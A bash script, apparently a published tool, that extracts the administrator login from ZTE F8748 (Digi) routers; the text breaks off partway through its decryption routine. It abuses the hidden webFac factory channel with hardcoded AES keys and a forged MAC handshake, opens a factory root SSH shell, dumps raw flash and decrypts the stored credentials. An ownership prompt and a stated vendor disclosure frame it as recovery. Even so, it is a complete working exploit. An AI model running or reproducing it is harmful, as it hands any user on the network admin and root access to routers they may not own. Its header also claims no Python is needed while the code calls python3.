#!/usr/bin/env bash
# =============================================================================
#  DIGI F8748 Admin Recovery — shell edition (macOS / Linux / WSL)
# =============================================================================
#  Recupera el login del administrador web de un router ZTE F8748 (Digi)
#  paso a paso, usando su propia interfaz de diagnóstico de fábrica.
#
#  SOLO USO AUTORIZADO: úsala únicamente en un router que sea tuyo o que
#  tengas permiso explícito para gestionar. Sin garantía alguna.
#
#  NO SE INSTALA NADA: ni en el router (no se toca firmware, software ni
#  configuración; solo se activa temporalmente el modo de diagnóstico que
#  el firmware ya trae, y se desactiva al terminar) ni en tu equipo
#  (nada persistente; los temporales se borran al salir).
#  Solo aprovechamos ese diseño para que el propio router muestre las
#  credenciales de administrador que ya tiene almacenadas.
#
#  Hallazgo notificado responsablemente a ZTE PSIRT (correo, 2026-09-22).
#
#  Dependencias: bash 3.2+, curl, openssl, xxd
#                expect + ssh solo para: arm/dump/disarm/recover (SSH)
#  No requiere compilar nada ni Python.
#
#  Uso:
#    ./digi-f8748.sh info                      # modelo/firmware/MACs
#    ./digi-f8748.sh handshake                 # reto webFac, no envía prueba
#    ./digi-f8748.sh arm                       # arma SSH de fábrica y desarma
#    ./digi-f8748.sh dump --out digi-dump      # vuelca seed/oss/paramtag/vid
#    ./digi-f8748.sh decrypt --dir digi-dump   # credenciales (offline)
#    ./digi-f8748.sh verify -U user -W pass    # prueba el login web
#    ./digi-f8748.sh disarm                    # cierra el SSH de fábrica
#    ./digi-f8748.sh recover                   # todo en uno
# =============================================================================
set -u
VERSION="0.0.2"

# ------------------------- constantes del firmware ZTE -----------------------
KEYPOOL_HEX="9c3375d11c424537184891731745794443d7d573335476d2c5f12c4f7aba61d95c69df8cd21cde3b352d2fe1de4c77f51a65d1fe18438ea742080478d5e4f334a4d3f236476d869d42651342dc429948dc679f9edc46375f849f6f76ce794f49"
FNV=16777619
MASK=2147483711
# Palabras de cabecera del payload (precomputadas; alfabeto "lmaozte...")
HDR_H0="apjd"; HDR_H1="apal"; HDR_HE="afpe"
# Codificación de cada byte (0..255) como palabra de 4 letras (precomputada)
MAC_ENC="lltn lleg lobz llzf llmg llbe mlbe llug lllm llav layb lltm llef lzby llzp llmf llbo mlbo llqa llll llau llya lltl llee lzbx llzo llme llbn mlbn llsh lllv llat mlat lltv lled lzbw llzn llmo llbm mlbm llsg lllu llas lawb lltu llen mlen llzm llmn llbl mlbl llsf lllt llar lawa lltt llem mlem llzl llmm llbk lazb llse llls llcy layh llts llel mlel llzk llml llbj laza llsd lllr locx llyg lltr llek mlek llzu llmk llbt mlbt llqf llfd llaz llyf llnd llae mlae llzt llmj llbs mlbs llqe llfc llay llye llnc llad mlad llzs llmt llbr mlbr llqd lllz llax llyd llle llac mlac llzr llms llbq lazh llqc llly llaw llyc llld llab mlab llzq llmr llbp lazg lloe lllx lzav llwe lllc llaa mlaa lltc llmq llbz lazf llod lllw lzau llwd lllb llak mlak llzz llmp llby llze lloc llda lzat llwc llla llaj mlaj llzy llmz llbx llzd llob llbc mlbc llwb lllk llai mlai llzx llmy llbw llzc lloa llbb mlbb llud lllj llah mlah llzw llmx llbv llzb llmc llba mlba lluc llli llag mlag llti llmw llbu llza llmb lldh mldh llub lllh llaf mlaf llth llmv lzbt llxc llma lldg lzaz llua lllg llap mlap lltg llmu lzbs llzj lloh llbi mlbi llwh lllf llao mlao lltq llgg lzbr llzi llog llbh mlbh llsb lllp llan mlan lltp llca lzdy llzh llmi llbg mlbg llsa lllo llam layd llto lleh mleh llzg llmh llbf mlbf lluh llln llal layc"

PARAMTAG_PREFIX="zx279132"
PARAMTAG_KEYHEX="8cc72b05705d5c46f412af8cbed55aad"
DEFAULT_VID="108"
HC_USER_KEY="SSH_UserName_2009"
HC_PASS_KEY="SSH_PassWord_2009"
DUMP_DEVICES="/dev/mtd9 /dev/mtd8 /dev/mtd10 /dev/mtd7"
PARAM_DEVICES="/dev/mtd1 /dev/mtd2 /dev/mtd3 /dev/mtd4 /dev/mtd5"

# ------------------------------- estado global -------------------------------
HOST="192.168.1.1"; WEBU="user"; WEBP="user"; CRAND=0
RMAC=""; CMAC=""; OUTDIR="digi-dump"
KEY_HEX=""; WF_COOKIE=""
T="$(mktemp -d)"
trap 'rm -rf "$T"' EXIT

log(){ printf '%s\n' "$*"; }
die(){ printf '[x] %s\n' "$*" >&2; exit 1; }
need(){ command -v "$1" >/dev/null 2>&1 || die "falta dependencia: $1  ($2)"; }

banner(){
  cat <<'BANNER'
 ____ ___ ____ ___
|  _ \_ _/ ___|_ _|
| | | | | |  _ | |
| |_| | | |_| || |
|____/___\____|___|
  ZTE F8748 (Digi) - ADMIN RECOVERY - solo uso autorizado
  Autor: github.com/686f6c61
BANNER
}
TAGLINE="Recuperador de la contraseña de administrador. Si estás aquí, es que la has perdido."

# ------------------------------ parseo de args -------------------------------
CMD="${1:-}"; [ $# -gt 0 ] && shift
while [ $# -gt 0 ]; do
  case "$1" in
    --host) HOST="$2"; shift 2;;
    --web-user) WEBU="$2"; shift 2;;
    --web-pass) WEBP="$2"; shift 2;;
    --client-rand) CRAND="$2"; shift 2;;
    --router-mac) RMAC="$2"; shift 2;;
    --client-mac) CMAC="$2"; shift 2;;
    --out|--dir) OUTDIR="$2"; shift 2;;
    -U|--user) VUSER="$2"; shift 2;;
    -W|--password) VPASS="$2"; shift 2;;
    --vid) VVID="$2"; shift 2;;
    --keep-ssh) KEEP=1; shift;;
    -y|--yes) YES=1; shift;;
    *) die "argumento desconocido: $1";;
  esac
done
case "${CMD:-help}" in
  -h|--help|help|"") sed -n '2,30p' "$0"; exit 0;;
esac

case "$CMD" in
  info|handshake|verify|decrypt|arm|disarm) ;;
  dump|recover) need ssh "para la parte SSH (brew install expect / apt install expect)"; need expect "para la parte SSH";;
esac
need curl "para el HTTP"
need openssl "para el AES/SHA"
need xxd "para conversiones hex"

# --------------------------------- MACs --------------------------------------
clean_mac(){ printf '%s' "$1" | tr -d ':-' | tr 'A-F' 'a-f'; }
mac_ok(){ [ ${#1} -eq 12 ] && printf '%s' "$1" | grep -qE '^[0-9a-f]{12}$'; }

resolve_macs(){
  if [ -z "$RMAC" ]; then
    ping -c1 -t1 "$HOST" >/dev/null 2>&1 || ping -c1 -W1 "$HOST" >/dev/null 2>&1 || true
    case "$(uname)" in
      Linux)
        RMAC=$(ip neigh show 2>/dev/null | awk -v ip="$HOST" '$1==ip && $5 ~ /:/ {print tolower($5); exit}' | tr -d ':')
        [ -n "$RMAC" ] || RMAC=$(awk -v ip="$HOST" '$1==ip && $3!="0x0" {print tolower($4); exit}' /proc/net/arp 2>/dev/null | head -1)
        ;;
      *)
        RMAC=$(arp -n "$HOST" 2>/dev/null | sed -n 's/.*at \([0-9a-f:]*\).*/\1/p' | head -1 | tr -d ':');;
    esac
  fi
  if [ -z "$CMAC" ]; then
    IF=$(route -n get "$HOST" 2>/dev/null | awk '/interface:/{print $2}')
    [ -z "$IF" ] && IF=$(ip route show default 2>/dev/null | awk '{print $5}' | head -1)
    if [ -n "${IF:-}" ]; then
      CMAC=$(ifconfig "$IF" 2>/dev/null | awk '/ether/{print $2}' | tr -d ':')
      [ -z "$CMAC" ] && CMAC=$(cat "/sys/class/net/$IF/address" 2>/dev/null | tr -d ':')
    fi
  fi
  RMAC=$(clean_mac "$RMAC"); CMAC=$(clean_mac "$CMAC")
  mac_ok "$RMAC" || die "Router MAC desconocida — pasa --router-mac aa:bb:cc:dd:ee:ff"
  mac_ok "$CMAC" || die "Client MAC desconocida — pasa --client-mac aa:bb:cc:dd:ee:ff"
  log "[*] Router MAC (br0): $(printf '%s' "$RMAC" | sed 's/../&:/g;s/:$//')"
  log "[*] Client MAC:       $(printf '%s' "$CMAC" | sed 's/../&:/g;s/:$//')"
}

# --------------------------- canal webFac (HTTP) -----------------------------
wf_init(){
  curl -s -m 8 -A Mozilla/5.0 --data-binary 'SendSq.gch' "http://$HOST/webFac" >/dev/null
  curl -s -m 8 -A Mozilla/5.0 --data-binary 'RequestFactoryMode.gch' "http://$HOST/webFac" >/dev/null 2>&1
  R=$(printf 'SendSq.gch?rand=%s\r\n' "$CRAND" | curl -s -m 8 -A Mozilla/5.0 --data-binary @- "http://$HOST/webFac")
  SR=$(printf '%s' "$R" | grep -oa 're_rand=[0-9]\+' | head -1 | cut -d= -f2)
  [ -n "${SR:-}" ] || die "webFac no devolvio re_rand (HTTP sin backdoor o firmware distinto)"
  IDX=$(( ((FNV * CRAND) & MASK) ^ SR ))
  IDX=$(( IDX % 60 ))
  KEY_HEX=$(printf '%s' "$KEYPOOL_HEX" | cut -c $(( IDX*2 + 1 ))-$(( IDX*2 + 48 )))
  log "[+] handshake ok: server_rand=$SR key_index=$IDX key=$KEY_HEX"
}

pad16(){ # stdin -> stdout, relleno con NUL hasta multiplo de 16
  LEN=$(wc -c < "$1" | tr -d ' ')
  PAD=$(( (16 - LEN % 16) % 16 ))
  cat "$1"
  [ "$PAD" -gt 0 ] && { i=0; while [ $i -lt $PAD ]; do printf '\000'; i=$((i+1)); done; }
  return 0
}

wf_send(){ # $1 = comando ASCII; respuesta cruda del router a stdout
  M="$1"
  L=${#M}; PAD=$(( 16 - L % 16 ))   # como el pad16 original: siempre 1..16 bytes
  PT="$T/pt.bin"; CT="$T/ct.bin"
  { printf '%s' "$M"; i=0; while [ $i -lt $PAD ]; do printf '\000'; i=$((i+1)); done; } > "$PT"
  openssl enc -aes-192-ecb -K "$KEY_HEX" -nosalt -nopad -in "$PT" -out "$CT" 2>/dev/null \
    || die "openssl no soporta aes-192-ecb (prueba con OpenSSL de Homebrew)"
  curl -s -m 10 -A Mozilla/5.0 --data-binary @"$CT" "http://$HOST/webFacEntry"
}

payload_msg(){ # $1=br0hex $2=clihex -> mensaje SendInfo
  G="${HDR_H0}${HDR_H1}${HDR_H0}${HDR_HE}"
  for hex in "$1" "$2" "$2"; do
    i=0
    while [ $i -lt 12 ]; do
      B=$(( 16#${hex:$i:2} ))
      W=$(printf '%s' "$MAC_ENC" | awk -v b="$B" '{for(j=1;j<=NF;j++) if(j-1==b){print $j; exit}}')
      G="$G$W"
      i=$((i+2))
    done
  done
  printf 'SendInfo.gch?info=22|%s' "$G"
}

mac_proof(){ payload_msg "$RMAC" "$CMAC"; }
wf_proof(){ R=$(wf_send "$(mac_proof)"); log "[+] prueba de MACs enviada"; }
wf_login(){ wf_send "CheckLoginAuth.gch?version50&user=$WEBU&pass=$WEBP" >/dev/null; }

factory_mode(){ # $1 = 2|armar 0|desarmar -> imprime "user pass"
  RAW=$(wf_send "FactoryMode.gch?mode=$1&user=notused")
  L=$(printf '%s' "$RAW" | wc -c | tr -d ' ')
  PAD=$(( (16 - L % 16) % 16 )); PADZ=$(( L + PAD ))
  printf '%s' "$RAW" > "$T/resp.bin"
  i=0; while [ $i -lt $PAD ]; do printf '\000' >> "$T/resp.bin"; i=$((i+1)); done
  DEC=$(openssl enc -d -aes-192-ecb -K "$KEY_HEX" -nosalt -nopad -in "$T/resp.bin" 2>/dev/null | tr -d '\000')
  UP=$(printf '%s' "$DEC" | grep -oa 'user=[^&]\+&pass=[^&[:cntrl:]]\+' | head -1)
  if [ -z "$UP" ]; then
    [ "$1" = "0" ] && return 0
    die "FactoryMode no devolvio credenciales (fallo la prueba de MACs?)"
  fi
  FU=$(printf '%s' "$UP" | sed 's/^user=\([^&]*\)&pass=.*/\1/')
  FP=$(printf '%s' "$UP" | sed 's/.*&pass=//')
  printf '%s %s' "$FU" "$FP"
}

arm_with_retries(){
  require_auth
  resolve_macs
  A=1
  while [ $A -le 3 ]; do
    log "[*] Ciclo factory SSH $A/3..."
    if wf_init 2>/dev/null; then wf_factory 0 "limpieza" || true; fi
    sleep 1.2
    if wf_init && wf_proof && wf_login; then
      R=$(factory_mode 2)
      if [ -n "$R" ]; then
        SSHU=${R%% *}; SSHP=${R##* }
        log "[+] factory SSH armado — user: $SSHU  pass: $SSHP"
        return 0
      fi
    fi
    log "[!] intento $A fallo"; sleep 2; A=$((A+1))
  done
  die "no se pudo armar el factory SSH"
}

wf_factory(){ # $1=mode $2=etiqueta (para armado con canal recien abierto)
  M="$1"
  wf_proof >/dev/null
  wf_login
  R=$(factory_mode "$M")
  if [ "$M" = "2" ]; then
    [ -n "$R" ] || die "armado vacio"
    printf '%s\n' "$R"
  fi
}

# ------------------------------- SSH (expect) --------------------------------
SSHU=""; SSHP=""

require_auth(){
  [ "${YES:-0}" = "1" ] && return 0
  if [ -t 0 ]; then
    log "Vas a activar temporalmente el diagnóstico de fábrica de $HOST."
    log "Confirma que eres el propietario del router o que tienes autorización"
    log "expresa del propietario para gestionarlo."
    printf "Escribe SI para continuar: "
    read -r A
    [ "$(printf '%s' "$A" | tr '[:lower:]' '[:upper:]')" = "SI" ] || die "cancelado"
  else
    die "se requiere confirmación interactiva de autorización (o el flag -y)"
  fi
}

confirm_git(){
  command -v git >/dev/null 2>&1 || return 0
  git -C "$OUTDIR" rev-parse --is-inside-work-tree >/dev/null 2>&1 || return 0
  log "[!] OJO: la carpeta de salida está dentro de un repo git."
  log "    Los volcados y credenciales de tu router NO deben subirse nunca."
  [ "${YES:-0}" = "1" ] && return 0
  [ -t 0 ] || die "carpeta de salida dentro de un repo git: confirma en una terminal o usa -y"
  printf "¿Continuar de todos modos? [escribe SI] "
  read -r A
  [ "$(printf '%s' "$A" | tr '[:lower:]' '[:upper:]')" = "SI" ] || die "cancelado: no se volcará nada dentro de un repo git"
}

# --------------------------- comandos del CLI --------------------------------
cmd_info(){
  log "== digi-f8748 $VERSION — info del router =="
  H=$(curl -s -m 8 -A Mozilla/5.0 "http://$HOST/")
  DEC=$(printf '%s' "$H" | awk '{o=$0; while (match(o, /&#[0-9]+;/)) { n = substr(o, RSTART+2, RLENGTH-3)+0; printf "%s%c", substr(o,1,RSTART-1), n; o = substr(o, RSTART+RLENGTH) } print o }')
  printf '%s' "$DEC" | grep -oa 'F[0-9]\{4\}[A-Z]\?' | sort -u | tr '\n' ' ' | sed 's/^/modelo: /'; echo
  T=$(printf '%s' "$DEC" | tr -d '\n' | sed -n 's/.*<title>\([^<]*\)<\/title>.*/\1/p' | head -1)
  [ -n "$T" ] && log "titulo: $T"
  IF=$(route -n get "$HOST" 2>/dev/null | awk '/interface:/{print $2}')
  [ -z "$IF" ] && IF=$(ip route show default 2>/dev/null | awk '{print $5}' | head -1)
  IP=$(ifconfig "$IF" 2>/dev/null | awk '/inet /{print $2}' | head -1)
  [ -z "$IP" ] && IP=$(ip -4 addr show "$IF" 2>/dev/null | awk '/inet /{split($2,a,"/"); print a[1]}' | head -1)
  EMAC=$(ifconfig "$IF" 2>/dev/null | awk '/ether/{print $2}' | head -1)
  [ -z "$EMAC" ] && EMAC=$(cat "/sys/class/net/$IF/address" 2>/dev/null)
  log "tu IP/MAC ($IF): $IP / ${EMAC:-?}"
  ping -c1 -t1 "$HOST" >/dev/null 2>&1 || ping -c1 -W1 "$HOST" >/dev/null 2>&1 || true
  RM=$(ip neigh show 2>/dev/null | awk -v ip="$HOST" '$1==ip && $5 ~ /:/ {print $5; exit}')
  [ -z "$RM" ] && RM=$(arp -n "$HOST" 2>/dev/null | sed -n 's/.*at \([0-9a-f:]*\).*/\1/p' | head -1)
  log "router MAC (ARP): ${RM:-?}"
  log "[i] Router MAC = pegatina/ARP; Client MAC = la de tu equipo en la lista del router"
}

cmd_handshake(){
  resolve_macs
  wf_init
  MSG=$(mac_proof)
  log "[+] prueba de MACs (22 palabras): $MSG"
  log "[i] dry-run: NO enviada (usa arm/recover para enviarla)"
}

cmd_arm(){
  arm_with_retries
  if [ "${KEEP:-0}" = "1" ]; then
    log "[i] --keep-ssh: dejando el SSH abierto (recuerda desarmar con 'disarm')"
  else
    sleep 1; wf_init && wf_proof && wf_login && factory_mode 0 >/dev/null
    log "[+] factory SSH desarmado"
  fi
}

cmd_disarm(){
  resolve_macs
  wf_init && wf_proof && wf_login
  factory_mode 0 >/dev/null
  log "[+] factory SSH desarmado"
}

cmd_verify(){
  [ -n "${VUSER:-}" ] && [ -n "${VPASS:-}" ] || die "verify necesita -U usuario -W contraseña"
  J=$(curl -s -m 15 -A Mozilla/5.0 "http://$HOST/?_type=loginData&_tag=login_entry")
  TOK=$(printf '%s' "$J" | grep -o '"sess_token":"[^"]*"' | cut -d'"' -f4)
  LT=$(printf '%s' "$J" | grep -o '"lockingTime":[0-9]*' | grep -o '[0-9]*$')
  if [ -n "$LT" ] && [ "$LT" -gt 0 ] 2>/dev/null; then die "login bloqueado (lockingTime=$LT)"; fi
  SALT=$(curl -s -m 15 -A Mozilla/5.0 "http://$HOST/?_type=loginData&_tag=login_token" \
         | sed 's/></>\n</g' | grep -o '>[^<]*<' | tr -d '<>' | grep -v '^\s*$' | head -1)
  [ -n "$SALT" ] || die "no se obtuvo salt (login_token)"
  HASH=$(printf '%s' "${VPASS}${SALT}" | openssl dgst -sha256 | awk '{print $NF}')
  RES=$(curl -s -m 15 -A Mozilla/5.0 \
        --data-urlencode "action=login" --data-urlencode "Username=$VUSER" \
        --data-urlencode "Password=$HASH" --data-urlencode "_sessionTOKEN=$TOK" \
        "http://$HOST/?_type=loginData&_tag=login_entry")
  if printf '%s' "$RES" | grep -q 'loginErrMsg":"[^"]\+'; then
    die "login rechazado: $(printf '%s' "$RES" | grep -o 'loginErrMsg":"[^"]*')"
  fi
  if curl -s -m 15 -A Mozilla/5.0 "http://$HOST/" | grep -q 'curRight\s*=\s*"1"'; then
    log "[+] login admin web confirmado (curRight=1)"
  else
    log "[!] login NO confirmado"
  fi
}

# ------------------------- volcado por SSH (dump) ----------------------------
cmd_dump(){
  arm_with_retries
  mkdir -p "$OUTDIR"
  if command -v git >/dev/null 2>&1 && git -C "$OUTDIR" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
    log "[!] OJO: la carpeta de salida está dentro de un repo git."
    log "    Los volcados y credenciales de tu router NO deben subirse nunca."
    [ "${YES:-0}" = "1" ] || { [ -t 0 ] || die "carpeta de salida dentro de un repo git: confirma en una terminal o usa -y"
      printf "¿Continuar de todos modos? [escribe SI] "
      read -r A
      [ "$A" = "SI" ] || die "cancelado: no se volcará nada dentro de un repo git"; }
  fi
  dump_all
  if [ "${KEEP:-0}" != "1" ]; then
    log "[*] desarmando factory SSH..."; sleep 1
    wf_init && factory_mode 0 >/dev/null && log "[+] desarmado"
  fi
  summarize
}

dump_all(){
  # 1) boardtype
  printf 'cat /proc/capability/boardtype\n' > "$T/cmds1"
  ssh_session "$T/cmds1" "$T/s1.log" || true
  sed -n '/X_BEGIN_1/,/X_END_1/p' "$T/s1.log" 2>/dev/null \
    | grep -vE 'X_BEGIN_1|X_END_1|cat /proc' > "$OUTDIR/boardtype.txt" || true
  VVID=$(sed -n 's/.*vid *: *\([0-9]\+\).*/\1/p' "$OUTDIR/boardtype.txt" 2>/dev/null | head -1)
  log "[+] board vid: ${VVID:-no encontrado}"

  # 2) paramtag
  get_paramtag
  # 3) seed + oss por ventanas de flash
  get_hardcode
}

ssh_session(){ # $1 cmds $2 log
  expect > /dev/null 2>&1 <<EOF
set timeout 120
log_file "$2"
match_max 100000
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR $SSHU@$HOST
expect {
  -re {[Pp]assword:} { send "$SSHP\r" }
  timeout { exit 1 }
}
expect "# "
set f [open "$1" r]
set cmds [split [read \$f] "\n"]
close \$f
set i 0
foreach cmd \$cmds {
  if { \$cmd eq "" } { continue }
  incr i
  send "echo X_BEGIN_\$i; \$cmd; echo X_END_\$i\r"
  expect {
    "X_END_\$i" {}
    timeout {}
  }
  expect "# "
}
send "exit\r"
expect eof
EOF
}

filter_chunk(){ # extrae hex limpio de la seccion i del log
  awk -v a="X_BEGIN_$1" -v b="X_END_$1" '
    $0 ~ a {on=1; next} $0 ~ b {on=0; next}
    on {print}' "$2" \
  | grep -viE 'hexdump|mtd_debug|copied|access denied|^/ #|busybox' \
  | tr -cd '0-9a-fA-F'
}

get_paramtag(){
  : > "$T/cmds2"
  printf "hexdump -ve '1/1 \"%%02x\"' /tagparam/paramtag\n" >> "$T/cmds2"
  ssh_session "$T/cmds2" "$T/s2.log" || true
  PT=$(filter_chunk 1 "$T/s2.log")
  DEC4=$(printf '%s' "${PT:0:8}" | xxd -r -p 2>/dev/null)
  if ! { [ ${#PT} -ge 128 ] && [ "$DEC4" = "TAGH" ]; }; then
    PT=""
    : > "$T/cmds2"
    for dev in $PARAM_DEVICES; do
      for size in 2048 4096 8192 16384; do
        printf "mtd_debug read %s 0 %s /var/tmp/digi_pt.bin\n" "$dev" "$size" >> "$T/cmds2"
        printf "hexdump -ve '1/1 \"%%02x\"' /var/tmp/digi_pt.bin\n" >> "$T/cmds2"
      done
    done
    ssh_session "$T/cmds2" "$T/s2.log" || true
    N=$(grep -c 'X_BEGIN_' "$T/s2.log" 2>/dev/null || echo 0)
    i=1
    while [ $i -le "$N" ]; do
      C=$(filter_chunk "$i" "$T/s2.log")
      HX=$(printf '%s' "${C:0:8}")
      DEC=$(printf '%s' "$HX" | xxd -r -p 2>/dev/null)
      if [ "$DEC" = "TAGH" ] && [ ${#C} -ge 128 ]; then PT="$C"; break; fi
      IDX=$(printf '%s' "$C" | grep -abo '54414748' | head -1 | cut -d: -f1)
      if [ -n "$IDX" ] && [ $(( ${#C} - IDX )) -ge 128 ]; then PT="${C:$IDX}"; break; fi
      i=$((i+1))
    done
  fi
  if [ -n "${PT:-}" ]; then
    printf '%s' "$PT" | xxd -r -p > "$OUTDIR/paramtag.bin" 2>/dev/null
    log "[+] paramtag: $(wc -c < "$OUTDIR/paramtag.bin" | tr -d ' ') bytes"
  else
    log "[!] paramtag no encontrado"
  fi
}

get_hardcode(){
  HEXALL="$T/flash.hex"; : > "$HEXALL"
  CHUNK=8192
  for dev in $DUMP_DEVICES; do
    : > "$T/cmds3"
    printf "mtd_debug read %s 0 16 /var/tmp/digi_p.bin\n" "$dev" >> "$T/cmds3"
    ssh_session "$T/cmds3" "$T/probe.log" || true
    grep -q -i copied "$T/probe.log" || { log "[*] $dev no legible, saltando"; continue; }
    log "[*] ventanas de flash en $dev (chunk=$CHUNK)..."
    : > "$T/cmds3"
    for off in 9961472 10223616 10485760 10747904 11010048 9437184 9699328 11272192 11534336 8388608 8912896; do
      n=$(( 262144 / CHUNK ))
      i=0
      while [ $i -lt $n ]; do
        o=$(( off + i * CHUNK ))
        printf "mtd_debug read %s %s %s /var/tmp/digi.bin\n" "$dev" "$o" "$CHUNK" >> "$T/cmds3"
        printf "hexdump -ve '1/1 \"%%02x\"' /var/tmp/digi.bin\n" >> "$T/cmds3"
        i=$((i+1))
      done
    done
    ssh_session "$T/cmds3" "$T/s3.log" || true
    N=$(grep -c 'X_BEGIN_' "$T/s3.log" 2>/dev/null || echo 0)
    i=1
    while [ $i -le "$N" ]; do
      C=$(filter_chunk "$i" "$T/s3.log")
      [ ${#C} -gt 100 ] && printf '%s' "$C" >> "$HEXALL"
      i=$((i+1))
    done
    log "[*] flash descargada: $(wc -c < "$HEXALL" | tr -d ' ') caracteres hex"
    xxd -r -p "$HEXALL" > "$T/flash.bin" 2>/dev/null
    # seed: 48-120 hex chars + version vN.N
    SEED=$(grep -aoE '[0-9a-fA-F]{48,120}v[0-9]+\.[0-9]+' "$T/flash.bin" | head -1)
    [ -z "$SEED" ] && SEED=$(grep -aoE '[[:print:]]{64,160}v[0-9]+\.[0-9]+' "$T/flash.bin" | head -1)
    # oss: contenedor zlib tras marcador ZTE
    OSS=$(python3 - "$T/flash.bin" <<'PYEOF' 2>/dev/null
import sys, zlib
blob = open(sys.argv[1], 'rb').read()
j = blob.find(b'oss')
while j != -1:
    for start in (max(0, j-32), j):
        area = blob[start:start+16416]
        di = area.find(b'\x85\x19\x02\xe0')
        if di == -1: continue
        rec = area[di:]
        for zi in range(0, min(300, len(rec)-2)):
            if rec[zi] == 0x78 and rec[zi+1] in (1, 0x5e, 0x9c, 0xda):
                for end in (2048, 4096, 8192, 16384, len(rec)):
                    try: plain = zlib.decompress(rec[zi:end])
                    except Exception: continue
                    if plain.startswith(b'\x01\x02\x03\x04'):
                        open('/tmp/digi_oss.bin','wb').write(plain); sys.exit(0)
    j = blob.find(b'oss', j+1)
sys.exit(1)
PYEOF
)
    if [ -n "$SEED" ]; then printf '%s\n' "$SEED" > "$OUTDIR/hardcode.seed"; log "[+] seed encontrada"; fi
    if [ -s /tmp/digi_oss.bin ]; then cp /tmp/digi_oss.bin "$OUTDIR/oss.bin"; log "[+] oss encontrado ($(wc -c < "$OUTDIR/oss.bin" | tr -d ' ') bytes)"; fi
    if [ -n "$SEED" ] && [ -s "$OUTDIR/oss.bin" ]; then return 0; fi
    log "[*] seed+oss incompletos en $dev; probando siguiente dispositivo..."
  done
}

summarize(){
  for f in hardcode.seed oss.bin paramtag.bin boardtype.txt; do
    [ -s "$OUTDIR/$f" ] && log "    $f: $(wc -c < "$OUTDIR/$f" | tr -d ' ') bytes"
  done
}

# ------------------------------ cripto offline -------------------------------
sha_hex(){ printf '%s' "$1" | openssl dgst -sha256 -r | awk '{print $1}'; }

cmd_decrypt(){
  [ -d "$OUTDIR" ] || die "no existe $OUTDIR — ejecuta dump antes"
  SEEDF="$OUTDIR/hardcode.seed"; OSSF="$OUTDIR/oss.bin"; PTF="$OUTDIR/paramtag.bin"
  [ -s "$SEEDF" ] && [ -s "$OSSF" ] && [ -s "$PTF" ] || die "faltan ficheros en $OUTDIR (dump incompleto)"
  VID=""
  [ -s "$OUTDIR/boardtype.txt" ] && VID=$(sed -n 's/.*vid *: *\([0-9]\+\).*/\1/p' "$OUTDIR/boardtype.txt" | head -1)
  VID="${VID:-${VVID:-$DEFAULT_VID}}"
  log "[*] board vid: $VID"

  # --- seed -> key/iv (hardcode AES) ---
  LINE=$(head -1 "$SEEDF" | tr -d '\r\n')
  [ ${#LINE} -ge 64 ] || die "seed demasiado corta"
  KPF="$T/kp.bin"; IPF="$T/iv.bin"; : > "$KPF"; : > "$IPF"
  i=0
  while [ $i -lt 64 ]; do
    CH="${LINE:$i:1}"
    CODE=$(printf '%d' "'$CH")
    if [ $i -ge 47 ] && [ $i -le 62 ]; then
      printf "\\x$(printf '%02x' $(( (CODE + 2) % 256 )))" >> "$KPF"
    fi
    if [ $i -ge 2 ] && [ $i -le 33 ]; then
      printf "\\x$(printf '%02x' $(( (CODE + 3) % 256 )))" >> "$IPF"
    fi
    i=$((i+1))
  done
  { cat "$KPF"; printf '%s' "${LINE:64}"; } > "$T/kstr.bin"
  head -c 32 "$T/kstr.bin" > "$T/kstr32.bin"
  HK=$(openssl dgst -sha256 -r < "$T/kstr32.bin" | awk '{print $1}')
  HIV=$(openssl dgst -sha256 -r < "$IPF" | awk '{print $1}'); HIV=${HIV:0:32}
  log "[*] hardcode key=${HK:0:16}... iv=${HIV:0:16}..."

  # --- descifrar contenedor oss ---
  CLEN_HEX=$(xxd -p -s 64 -l 4 "$OSSF" | tr -d '\n')
  CLEN=$(( 16#${CLEN_HEX:6:2}${CLEN_HEX:4:2}${CLEN_HEX:2:2}${CLEN_HEX:0:2} ))
  dd if="$OSSF" of="$T/oss_ct.bin" bs=1 skip=72 count=$CLEN 2>/dev/null
  openssl enc -d -aes-256-cbc -K "$HK" -iv "$HIV" -nopad -in "$T/oss_ct.bin" -out "$T/oss_pt.bin" 2>/dev/null \
    || die "fallo descifrando oss (seed incorrecta?)"
  # PKCS unpad + catalogo
  CATALOG=$(python3 - "$T/oss_pt.bin" <<'PYEOF' 2>/dev/null
import sys
d = open(sys.argv[1], 'rb').read()
n = d[-1]
if 1 <= n <= 16 and d.endswith(bytes([n]) * n): d = d[:-n]
sys.stdout.write(d.decode('utf-8', 'replace'))
PYEOF
)
  USER_OSS=$(printf '%s\n' "$CATALOG" | sed -n "s/^$HC_USER_KEY=//p" | head -1)
  PASS_OSS=$(printf '%s\n' "$CATALOG" | sed -n "s/^$HC_PASS_KEY=//p" | head -1)

  # --- paramtag ---
  MAT="${PARAMTAG_PREFIX}${VID}${PARAMTAG_KEYHEX}"; MAT="${MAT:0:32}"
  DIG=$(printf '%s' "$MAT" | openssl dgst -sha256 -r | awk '{print $1}')
  PK=${DIG:0:32}; PIV=${DIG:32:32}
  USER_TAG=""; PASS_TAG=""
  POS=20; SZ=$(wc -c < "$PTF" | tr -d ' ')
  while [ $(( POS + 10 )) -le $SZ ]; do
    PID_HEX=$(dd if="$PTF" bs=1 skip=$POS count=2 2>/dev/null | xxd -p | tr -d '\n')
    LN_HEX=$(dd if="$PTF" bs=1 skip=$((POS+4)) count=2 2>/dev/null | xxd -p | tr -d '\n')
    F6_HEX=$(dd if="$PTF" bs=1 skip=$((POS+6)) count=2 2>/dev/null | xxd -p | tr -d '\n')
    F8_HEX=$(dd if="$PTF" bs=1 skip=$((POS+8)) count=2 2>/dev/null | xxd -p | tr -d '\n')
    PID=$(( 16#${LN_HEX:0:0}${PID_HEX:2:2}${PID_HEX:0:2} ))
    LN=$(( 16#${LN_HEX:2:2}${LN_HEX:0:2} ))
    F6=$(( 16#${F6_HEX:2:2}${F6_HEX:0:2} ))
    F8=$(( 16#${F8_HEX:2:2}${F8_HEX:0:2} ))
    if [ "$LN" -lt 0 ] || [ "$LN" -gt 4096 ]; then break; fi
    NPOS=$(( (POS + LN + 9) & ~3 ))
    if [ "$F6" -eq 0 ] && [ "$F8" -eq 1 ]; then
      dd if="$PTF" of="$T/rec.bin" bs=1 skip=$((POS+10)) count=$(( NPOS - POS - 10 )) 2>/dev/null
      DEC=$(openssl enc -d -aes-128-cbc -K "$PK" -iv "$PIV" -nopad -in "$T/rec.bin" 2>/dev/null | head -c 4096)
      # quita PKCS + NULs + corta en primer no-hex
